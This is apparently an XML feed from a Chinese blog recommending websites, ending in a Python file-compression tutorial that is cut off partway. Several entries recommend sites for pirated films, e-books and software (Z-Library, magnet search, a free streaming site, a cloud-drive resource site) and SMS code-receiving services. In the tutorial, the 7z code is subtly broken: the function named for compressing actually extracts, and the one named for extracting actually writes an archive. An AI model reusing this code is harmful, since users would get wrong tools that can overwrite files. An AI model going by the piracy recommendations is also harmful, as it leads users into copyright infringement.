        <content type="html"><![CDATA[<p>点开一个开始，希望键盘的每一次敲击，每一次搜索，都能让您得到精准的反馈！</p><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>一个开始聚合导航网站，做的很有特色，做了很多搜索，常见的网页搜索，默认是百度，当然，也有一些特色的，比如资源搜索，里面的内容就很丰富了，网盘搜索啊、BT搜索啊，游戏搜索啊，这些统统都内置了的，不止这么多，还有什么创意制作内置了搜索，平常制作短视频，所用到的图片、音频、视频都进行资源规整，不可多得的宝藏网站！</p><h2 id="界面："><a href="#界面：" class="headerlink" title="界面："></a>界面：</h2><p><img src="https://static.luozhinet.com/06/1b6faf4f87d39890fe6e758c6e3909"></p><p><img src="https://static.luozhinet.com/5d/7b47a0e39e1ffa5a53e6d993d1bb73"></p><h2 id="网站直达："><a href="#网站直达：" class="headerlink" title="网站直达："></a>网站直达：</h2><p><a href="https://aur.one/">https://aur.one/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网盘 </tag>
            
            <tag> 搜索 </tag>
            
            <tag> 资源 </tag>
            
            <tag> 视频 </tag>
            
            <tag> 网站 </tag>
            
            <tag> 图片 </tag>
            
            <tag> aur </tag>
            
            <tag> 特色 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免费PDF、视频、图片转换-在线工具TinyWow</title>
      <link href="/posts/ad5499059bd8/"/>
      <url>/posts/ad5499059bd8/</url>
      
        <content type="html"><![CDATA[<p>在这里可以任意转换PDF文件，视频剪辑、压缩、转化GIF，图片转换、二维码生成等诸多功能！</p><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>TinyWow 提供免费的在线转换、pdf 和其他方便的工具来帮助您解决各种类型的问题。15 分钟后删除所有已处理和未处理的文件！这是一个制作精美小工具网站，大概率是一个国人做的，界面是英文，但是基本都能看懂，推荐使用Google浏览器一键翻译哦！</p><h2 id="界面："><a href="#界面：" class="headerlink" title="界面："></a>界面：</h2><p><img src="https://static.luozhinet.com/ff/38c874e16cc2021df8124aa66486fa"></p><p><img src="https://static.luozhinet.com/b6/1f1c185f4fb51c43f67b728d616380"></p><h2 id="网址直达："><a href="#网址直达：" class="headerlink" title="网址直达："></a>网址直达：</h2><p><a href="https://tinywow.com/">https://tinywow.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免费 </tag>
            
            <tag> 文件 </tag>
            
            <tag> 界面 </tag>
            
            <tag> 转换 </tag>
            
            <tag> 视频 </tag>
            
            <tag> 网站 </tag>
            
            <tag> 生成 </tag>
            
            <tag> 图片 </tag>
            
            <tag> 剪辑 </tag>
            
            <tag> pdf </tag>
            
            <tag> tinywow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>值得收藏的验证码接收平台</title>
      <link href="/posts/2fd3a35e49e0/"/>
      <url>/posts/2fd3a35e49e0/</url>
      
        <content type="html"><![CDATA[<p>现在很多手机客户端都需要手机号登录了，还有更可恶的强制使用手机号登录，为了防止隐私收集，有必要规避一些非必要的注册及使用，保护自己的隐私。</p><p>随着现在各大网站及手机APP使用，涉及验证码验证一些特殊场景，验证码的接收就很有必要。验证码接收平台有很多，有免费的，有收费的，还是具体使用情况，自己把握，如果是为了“交作业”使用的一些APP，那很有必要使用接码平台，防止使用自己手机号被垃圾短信及电话骚扰；如若涉及金融、交易等重要使用场景，强烈建议使用自己手机号，以免后续给自己带来麻烦。</p><p>现在我也感觉接码平台对一些特殊场景是真的好用，但是记得一定要规范使用哦！涉及充值的平台，还是劝大家不要购买太长时间，因为接码平台圈钱后就容易跑路。。。</p><h2 id="不分国内外免费："><a href="#不分国内外免费：" class="headerlink" title="不分国内外免费："></a>不分国内外免费：</h2><p>Z-SMS：<a href="http://www.z-sms.com/">http://www.z-sms.com/</a></p><p>无敌云短信：<a href="https://clearcode.cn/">https://clearcode.cn/</a></p><p>小鸟接码：<a href="http://www.xnsms.com/">http://www.xnsms.com/</a></p><p>在线接码：<a href="https://yunjiema.net/">https://yunjiema.net/</a></p><p>免费接码：<a href="https://mianfeijiema.com/">https://mianfeijiema.com/</a></p><p>接码号：<a href="https://jiemahao.com/">https://jiemahao.com/</a></p><p>在线接收：<a href="http://www.shejiinn.com/">http://www.shejiinn.com/</a></p><p>在线接收：<a href="https://turtle-sms.xyz/">https://turtle-sms.xyz/</a></p><p>inlet: <a href="https://inlet.tel/">https://inlet.tel/</a></p><p>在线接收：<a href="http://www.ohuptt.com/">http://www.ohuptt.com/</a></p><p>免费接收免费香港号：<a href="https://www.smsbo.com/phone/hongkong">https://www.smsbo.com/phone/hongkong</a></p><p>在线接码：<a href="https://zaixianjiema.com/">https://zaixianjiema.com/</a></p><p>国外的：<a href="https://5sim.net/">https://5sim.net/</a></p><p>有一个挺好用：</p><p>SMS：<a href="https://sms-man.com/cn">https://sms-man.com/cn</a></p><p>免费的接码平台易跑路，且用且珍惜，如果打不开，请不要气馁，继续尝试下一个，祝大家使用愉快！</p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免费 </tag>
            
            <tag> 注册 </tag>
            
            <tag> 使用 </tag>
            
            <tag> 网站 </tag>
            
            <tag> xyz </tag>
            
            <tag> 接码 </tag>
            
            <tag> 接收 </tag>
            
            <tag> 验证码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分享几个好用磁力搜索网站</title>
      <link href="/posts/614eaeedc0e3/"/>
      <url>/posts/614eaeedc0e3/</url>
      
        <content type="html"><![CDATA[<p>千万不要觉得磁力在这个短视频时代好像已经过去了，可以确定的说过去、现在、未来依旧还在！</p><h2 id="小草磁力"><a href="#小草磁力" class="headerlink" title="小草磁力"></a>小草磁力</h2><p><img src="https://static.luozhinet.com/bf/faa716d5ea345cfb815721dd445b5e"></p><p>资源丰富，无论您想看什么电影几乎都能找到，可以找影视剧，电子书等，资源速度快！</p><h2 id="磁力天堂"><a href="#磁力天堂" class="headerlink" title="磁力天堂"></a>磁力天堂</h2><p><img src="https://static.luozhinet.com/28/7ede36cef754faad89ba20c4fb62e9"></p><p>什么都不说了，打开自己搜搜就知道了！</p><h2 id="磁力爬"><a href="#磁力爬" class="headerlink" title="磁力爬"></a>磁力爬</h2><p><img src="https://static.luozhinet.com/da/53a960a3ec516cf035f56dfc1b8529"></p><p>也不演示了，还是装上迅雷试试速度吧，看看资源全不全，再说话！</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>小草磁力：xccl6.xyz</p><p>磁力天堂:cltt111.xyz</p><p>磁力爬：<a href="http://www.clp2022.xyz/">http://www.clp2022.xyz/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电子书 </tag>
            
            <tag> 资源 </tag>
            
            <tag> 视频 </tag>
            
            <tag> xyz </tag>
            
            <tag> 磁力 </tag>
            
            <tag> 天堂 </tag>
            
            <tag> xccl6 </tag>
            
            <tag> cltt111 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小舒同学</title>
      <link href="/posts/0ff886e4cbd3/"/>
      <url>/posts/0ff886e4cbd3/</url>
      
        <content type="html"><![CDATA[<p>可能很好奇，小舒同学是啥？小爱同学？NO！小舒同学是省事、高效的新一代新建标签页浏览器扩展，让你的主页更加简单，更加方便！</p><p>简单并不意味着欠缺或低劣，也不意味着不注重装饰或者完全赤裸裸。而是说装饰应该紧密贴近设计本身，任何无关的要素都应该予以剔除。</p><p>我们费尽心思折腾我们的主页<br>却从来没好好整理过我们的收藏夹</p><h2 id="界面："><a href="#界面：" class="headerlink" title="界面："></a>界面：</h2><p><img src="https://static.luozhinet.com/51/8474f2abc3b45bb6c2075053596c62"></p><p>开箱即用，无需配置，自定义程度超高！喜欢的就赶紧种草吧！</p><h2 id="地址："><a href="#地址：" class="headerlink" title="地址："></a>地址：</h2><p><a href="https://xiaoshu.app/">https://xiaoshu.app/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 界面 </tag>
            
            <tag> 小舒 </tag>
            
            <tag> 同学 </tag>
            
            <tag> 主页 </tag>
            
            <tag> xiaoshu </tag>
            
            <tag> 装饰 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字图书馆-Zlibrary</title>
      <link href="/posts/974025381448/"/>
      <url>/posts/974025381448/</url>
      
        <content type="html"><![CDATA[<p>免费的数字图书馆，图书种类丰富，统统免费下载！找个好的阅读器开始书香之旅吧！</p><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>Zlibrary是全球最大的数字图书馆，自2009年免费的图书馆，里面包含各种文学著作，理工学科，人文艺术、学术论文等应有尽有，书籍提供多种格式下载，包括PDF、epub、mobi等格式下载！</p><h2 id="界面："><a href="#界面：" class="headerlink" title="界面："></a>界面：</h2><p><img src="https://static.luozhinet.com/80/c098aabf3cb34c6fef6bd350e15f17"></p><p><img src="https://static.luozhinet.com/a9/14d5f7ecbf9d5b64c014b5e296d0f6"></p><p>网站可以绑定kindle账号，网站可以把书籍推送到您的kindle账号里，内容及其丰富，任君自己选择，包您满意！</p><h2 id="网站地址："><a href="#网站地址：" class="headerlink" title="网站地址："></a>网站地址：</h2><p>主域名：<a href="https://zh.z-lib.org/">https://zh.z-lib.org/</a> （国内大概率打不开）</p><p>备用域名：<a href="https://zh.b-ok.com/">https://zh.b-ok.com/</a> （用这个，暂时先用着，如果有办法还是用主域名）</p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免费 </tag>
            
            <tag> 域名 </tag>
            
            <tag> 界面 </tag>
            
            <tag> epub </tag>
            
            <tag> 网站 </tag>
            
            <tag> 下载 </tag>
            
            <tag> 图书馆 </tag>
            
            <tag> kindle </tag>
            
            <tag> 书籍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>白嫖者联盟影视网站</title>
      <link href="/posts/8114abfc3c52/"/>
      <url>/posts/8114abfc3c52/</url>
      
        <content type="html"><![CDATA[<p>类似的白嫖还不多吗？谁知道还能活多久呢！不用开VIP就能看开端多爽啊！</p><p>白嫖者联盟名字就很意思，不知道还以为应有尽有的，这其实是一个网站，强大的影视网站，内容详实，喜欢看剧的朋友不可错过！网站界面包括常见的电影、电视剧、动漫、综艺在内的多种剧集，提供了在线观看、资源下载、字幕下载多种选择。</p><p>这个网站充当的是一个盒子的功能，内置了点播源，如若遇到不能播放的情况，换源多试试！</p><h2 id="界面："><a href="#界面：" class="headerlink" title="界面："></a>界面：</h2><p>PC端界面：</p><p><img src="https://static.luozhinet.com/61/f9d34c5675d40e52c4d1893f08df87"></p><p><img src="https://static.luozhinet.com/31/fd137897c58e8bf53e0dae752260b6"></p><p>手机端界面：</p><p><img src="https://static.luozhinet.com/ad/b61d364996716bc3aa3eba64dd7e56"></p><p><img src="https://static.luozhinet.com/8c/1bd265df449b5cc547802a9e335cc9"></p><p><img src="https://static.luozhinet.com/e2/3be302ac2d1344e19ab68e1bdbdb23"></p><p>手机端界面制作精美，不要额外下载APP即可点播观看！</p><h2 id="官网直达："><a href="#官网直达：" class="headerlink" title="官网直达："></a>官网直达：</h2><p>地址：<a href="https://www.bpzhe.com/">https://www.bpzhe.com</a></p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 界面 </tag>
            
            <tag> 资源 </tag>
            
            <tag> 网站 </tag>
            
            <tag> 下载 </tag>
            
            <tag> 播源 </tag>
            
            <tag> 白嫖 </tag>
            
            <tag> 白嫖者 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>辅助狗-良心软件搜索平台</title>
      <link href="/posts/1d47fecff31e/"/>
      <url>/posts/1d47fecff31e/</url>
      
        <content type="html"><![CDATA[<p>干净、无捆绑、无劫持良心的软件辅助搜索平台！</p><h2 id="界面："><a href="#界面：" class="headerlink" title="界面："></a>界面：</h2><p><img src="https://static.luozhinet.com/bd/084e7ba9199408f278cae031140820"></p><p><img src="https://static.luozhinet.com/b7/caef650c085521cab00867b9d64de3"></p><p><img src="https://static.luozhinet.com/52/039bfd985187a775f53ffc3eac8f16"></p><h2 id="地址直达："><a href="#地址直达：" class="headerlink" title="地址直达："></a>地址直达：</h2><p><a href="https://www.fuzhugou.com/">https://www.fuzhugou.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 界面 </tag>
            
            <tag> 良心 </tag>
            
            <tag> 直达 </tag>
            
            <tag> 劫持 </tag>
            
            <tag> 捆绑 </tag>
            
            <tag> 干净 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里网盘-小纸条资源分享站</title>
      <link href="/posts/07e9d65b0696/"/>
      <url>/posts/07e9d65b0696/</url>
      
        <content type="html"><![CDATA[<p>阿里网盘现在凭借不限速的口号，名气越来越大！众多网友都纷纷献出了珍藏多年的资源，你确定不来看看吗？</p><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>今天介绍的是阿里网盘资源站-小纸条，这样的资源网站不多见啊，真的见一个都要收藏一个！很纯粹的资源分享网站，包含电视、电影、动漫、音乐、软件、文档等资源呢，网站每天都会更新新上资源，截止到目前共搜集了2774个资源，大家快来转存啊！</p><h2 id="界面："><a href="#界面：" class="headerlink" title="界面："></a>界面：</h2><p><img src="https://static.luozhinet.com/a7/296d0e8f4b743d74a70265418c1539"></p><p>资源多多，支持搜搜，不可多得的良心网站！</p><p><img src="https://static.luozhinet.com/7d/17aad4c771aa4ef2e878acda07bab7"></p><p>最近更新，最新日期显示今天，很多优秀的资源，等待你探索哦！</p><p><img src="https://static.luozhinet.com/80/42af64f53123981b9e5abfda94cba9"></p><p>软件也多多，WPS、看图、广联达、office等办公软件等你来转存哦！</p><p><img src="https://static.luozhinet.com/ef/dd9ebffb94fbf47c1888a1b5c600d4"></p><p>知识培训，养生、练习、学习等应有尽有，人的精力是有限的，择优选择吧，一定不会后悔的，最重要的是自己的网盘够不够大！</p><p>听说还有一款还东西，叫做阿里TV，大家伙可以了解了解，搭配一起观影体验是真的不错！</p><h2 id="网址地址："><a href="#网址地址：" class="headerlink" title="网址地址："></a>网址地址：</h2><p>小纸条-开放纯粹的资源网站</p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网盘 </tag>
            
            <tag> 资源 </tag>
            
            <tag> 网站 </tag>
            
            <tag> 阿里 </tag>
            
            <tag> 纸条 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elib-电子书搜索网站</title>
      <link href="/posts/fed5d65f1ac1/"/>
      <url>/posts/fed5d65f1ac1/</url>
      
        <content type="html"><![CDATA[<p>Elib可以搜索自己想要的书籍，比如经典书籍、古典文学、哲学、理工资料、学术论文都可以在这搜索！</p><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>上海疫情，让我们又看到了一些东西，现在很困难，经济收到巨大冲击，有一部分被优化，用东哥的话讲被毕业了。。。</p><p>现在的当下，尽量多读书，看清社会运作本质，了解人性、心理学，在一些方面还是可以帮助到自己的，多读书、多学习，是当下缓解焦虑的不二法门。</p><h2 id="界面："><a href="#界面：" class="headerlink" title="界面："></a>界面：</h2><p><img src="https://static.luozhinet.com/fc/84bd92d6549889979fe8c17d86e469"></p><p><img src="https://static.luozhinet.com/a4/67371655cfba3e0e6b9a18aeded2f5"></p><h2 id="下载："><a href="#下载：" class="headerlink" title="下载："></a>下载：</h2><p>新用户在首页中没有注册选项，经过片刻摸索找到了注册的方法。</p><p>使用注册邮箱发送主题为 signup 的邮件到 <a href="mailto:&#x61;&#x75;&#x74;&#104;&#64;&#101;&#x6c;&#105;&#x62;&#x2e;&#99;&#x63;">&#x61;&#x75;&#x74;&#104;&#64;&#101;&#x6c;&#105;&#x62;&#x2e;&#99;&#x63;</a> 内容可为空。片刻会收到一封随机密码的邮件。</p><p>登录后可更改密码，然后在搜索电子书就可以下载.epub 格式的电子书了。</p><p>具体的.epub格式电子书的阅读器这里按自己的喜好打开阅读就行了</p><h2 id="地址："><a href="#地址：" class="headerlink" title="地址："></a>地址：</h2><p><a href="https://elib.cc/">https://elib.cc/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 搜索 </tag>
            
            <tag> 电子书 </tag>
            
            <tag> epub </tag>
            
            <tag> 注册 </tag>
            
            <tag> auth@elib.cc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>几秒钟删除照片里你不需要的元素-Magiceraser</title>
      <link href="/posts/4b6cb4514456/"/>
      <url>/posts/4b6cb4514456/</url>
      
        <content type="html"><![CDATA[<p>日常处理图片的时候，可能照片的某个地方不需要，要删掉某个元素，很多朋友对于PS不是很精通，但现在有一个很好的图片处理工具，供大家使用！</p><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>Magic Eraser 是一款免费的 AI 工具，可以在几秒钟内从图片中删除不需要的元素，步骤也非常简单，而且无需注册，即传即用！没有任何付费模式，100%免费，试一试，它是完全免费的。</p><h2 id="界面："><a href="#界面：" class="headerlink" title="界面："></a>界面：</h2><p><img src="https://static.luozhinet.com/f5/8af9cc9b07fdf7c8b1dfc1c414fb80"></p><p><img src="https://static.luozhinet.com/7a/2edab83b4ef97788e9224221801166"></p><p>试试很简单，只需要上传、处理、下载一气呵成，简单越快，用完即走！</p><h2 id="网站地址："><a href="#网站地址：" class="headerlink" title="网站地址："></a>网站地址：</h2><p><a href="https://www.magiceraser.io/">https://www.magiceraser.io/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免费 </tag>
            
            <tag> 注册 </tag>
            
            <tag> 处理 </tag>
            
            <tag> 图片 </tag>
            
            <tag> eraser </tag>
            
            <tag> 简单 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过Google play下载APK的一种方式</title>
      <link href="/posts/fb79b38d6277/"/>
      <url>/posts/fb79b38d6277/</url>
      
        <content type="html"><![CDATA[<p>Google 太强势了，很多手机也安装不了GMS，又想用play商店里面的软件，该怎么办呢？</p><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>今天给大家介绍一种下载play商店的一个网站，可以下载想要的软件！和APkpure一样，网站境内无法访问，所以，大家准备好家伙什吧！</p><h2 id="界面："><a href="#界面：" class="headerlink" title="界面："></a>界面：</h2><p><img src="https://static.luozhinet.com/83/5b911481a06980a87196e1c3de3c86"></p><p><img src="https://static.luozhinet.com/26/049ceb160dc48e6709b9308a297b07"></p><p>很简单，打开Google商店链接，添加至下载框，等待解析，之后下载就可以了，非常的easy!</p><h2 id="网站地址："><a href="#网站地址：" class="headerlink" title="网站地址："></a>网站地址：</h2><p><a href="https://apps.evozi.com/">https://apps.evozi.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> google </tag>
            
            <tag> 下载 </tag>
            
            <tag> 商店 </tag>
            
            <tag> play </tag>
            
            <tag> gms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腾讯智影AI剪辑-在线视频剪辑</title>
      <link href="/posts/94456e62e22c/"/>
      <url>/posts/94456e62e22c/</url>
      
        <content type="html"><![CDATA[<p>智影剪辑是腾讯出品在线视频剪辑工作，能够快速帮您制作短视频，提高剪辑效率！</p><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>智影是一个集素材搜集、视频剪辑、后期包装、渲染导出和发布于一体的免费在线剪辑平台，能够为用户提供从端到端的一站式视频剪辑及制作服务。</p><p>腾讯开发的在线影视剪辑工具，其功能包括：文本配音、字幕识别、视频剪辑、文章转视频、数字人播报、智能去水印、智能横转竖功能。腾讯确实是好用，输入文本文档，有很多发音人可以选择，很多的配音助手可供选择，很多功能都是免费的，大厂确实有钱！</p><p>这个有文章转视频的功能，一篇文章会智能匹配系统的素材库，自动生成视频。知乎也有类似的功能，一篇文档形成后，可以选择生成视频，生成了视频素材后，还可以对视频进行进一步的编辑，其他的功能大家登录账号，找一个视频试一试，看看效果如何！</p><h2 id="界面："><a href="#界面：" class="headerlink" title="界面："></a>界面：</h2><p><img src="https://static.luozhinet.com/e0/08a17e26f8faac824669eba02ee8b7"></p><p>网站地址：</p><p><a href="https://zenvideo.qq.com/home">https://zenvideo.qq.com/home</a></p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 素材 </tag>
            
            <tag> 视频 </tag>
            
            <tag> 生成 </tag>
            
            <tag> 剪辑 </tag>
            
            <tag> 智影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>清图-模糊图片变清晰</title>
      <link href="/posts/1235535247cb/"/>
      <url>/posts/1235535247cb/</url>
      
        <content type="html"><![CDATA[<p>清图是一款基于深度学习技术将模糊图片变清晰的在线工具。</p><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>清图是一个在线把模糊照片变清晰的免费工具，清图基于领先的深度学习技术，对质量较低的图片进行色彩处理、无损放大等优化处理，重建高清图像。将低分辨率的图片无损放大为高分辨率图片，处理速度非常迅速，体验也不错，分享给需要的小伙伴们！</p><p>修复老照片的福利啊，特别是自己十年前的图片，可以拿出来做一下处理一下，记得登录注册，不注册会有水印，还提供了抠图、证件照、文本自动配音功能。</p><p><img src="https://static.luozhinet.com/ec/0c7d204cbd73826b649d3e89ff3f14"></p><h2 id="界面："><a href="#界面：" class="headerlink" title="界面："></a>界面：</h2><p><img src="https://static.luozhinet.com/36/99fc809bc7d67cc54f46eb6e542891"></p><p>来一张对比图：</p><p><img src="https://static.luozhinet.com/ba/62b088d4a3ac32bcfc9d9cb0149552"></p><h2 id="地址"><a href="#地址" class="headerlink" title="地址:"></a>地址:</h2><p><a href="https://qingtu.cn/">https://qingtu.cn/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 处理 </tag>
            
            <tag> 图片 </tag>
            
            <tag> 无损 </tag>
            
            <tag> 深度学习 </tag>
            
            <tag> 清图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>怎么用python做一个解压缩小工具，以后再也不用下载各种格式的解压缩软件了...</title>
      <link href="/posts/4acff0774207/"/>
      <url>/posts/4acff0774207/</url>
      
        <content type="html"><![CDATA[<p>经常由于各种压缩格式的不一样用到文件的解压缩时就需要下载不同的解压缩工具去处理不同的文件，以至于桌面上的压缩工具就有三四种，于是使用python做了一个包含各种常见格式的文件解压缩的小工具。</p><p><img src="https://static.luozhinet.com/4f/d15f6e6c40e536ee5f9a705991f07c" alt="file"></p><p>常见的压缩格式主要是下面的四种格式：</p><p>zip 格式的压缩文件，一般使用360压缩软件进行解压缩。<br>tar.gz 格式的压缩文件，一般是在linux系统上面使用tar命令进行解压缩。<br>rar 格式的压缩文件，一般使用rar压缩软件进行解压缩。<br>7z 格式的压缩文件，一般使用7-zip压缩软件进行解压缩。</p><p>导入zip格式的解压缩处理的非标准库。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile <span class="keyword">as</span> <span class="built_in">zip</span></span><br></pre></td></tr></table></figure><p>编写zip解压缩格式的文件压缩函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">do_zip</span>(<span class="params">source_, target_file</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    zip文件压缩</span></span><br><span class="line"><span class="string">    :param source_: 原始文件路径</span></span><br><span class="line"><span class="string">    :param target_file: 目标文件路径</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    zip_file = <span class="built_in">zip</span>.ZipFile(target_file, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    pre_len = <span class="built_in">len</span>(os.path.dirname(source_))</span><br><span class="line">    <span class="keyword">for</span> parent, dirnames, filenames <span class="keyword">in</span> os.walk(source_):</span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;filename&#125;</span>&#x27;</span>)</span><br><span class="line">            path_file = os.path.join(parent, filename)</span><br><span class="line">            arcname = path_file[pre_len:].strip(os.path.sep)</span><br><span class="line">            zip_file.write(path_file, arcname)</span><br><span class="line"></span><br><span class="line">    zip_file.close()</span><br></pre></td></tr></table></figure><p>编写zip解压缩格式的文件解压缩函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">un_zip</span>(<span class="params">source_file, target_</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    zip文件解压缩</span></span><br><span class="line"><span class="string">    :param source_file: 原始文件路径</span></span><br><span class="line"><span class="string">    :param target_: 目标文件路径</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    zip_file = <span class="built_in">zip</span>.ZipFile(source_file)</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(target_):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.mkdir(target_)</span><br><span class="line">    <span class="keyword">for</span> names <span class="keyword">in</span> zip_file.namelist():</span><br><span class="line">        zip_file.extract(names, target_)</span><br><span class="line">    zip_file.close()</span><br></pre></td></tr></table></figure><p>导入7z格式的解压缩处理的非标准库。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> py7zr</span><br></pre></td></tr></table></figure><p>编写7z解压缩格式的文件压缩函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">do_7z</span>(<span class="params">source_, target_file</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    7z文件压缩</span></span><br><span class="line"><span class="string">    :param source_:</span></span><br><span class="line"><span class="string">    :param target_file:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> py7zr.SevenZipFile(target_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.extractall(path=source_)</span><br></pre></td></tr></table></figure><p>编写7z解压缩格式的文件解压缩函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">un_7z</span>(<span class="params">source_file, target_</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    7z文件解压缩</span></span><br><span class="line"><span class="string">    :param source_file:</span></span><br><span class="line"><span class="string">    :param target_:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> py7zr.SevenZipFile(source_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.writeall(target_)</span><br></pre></td></tr></table></figure><p>导入rar格式的解压缩处理的非标准库。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rarfile <span class="keyword">as</span> rar</span><br></pre></td></tr></table></figure><p>编写rar解压缩格式的文件解压缩函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 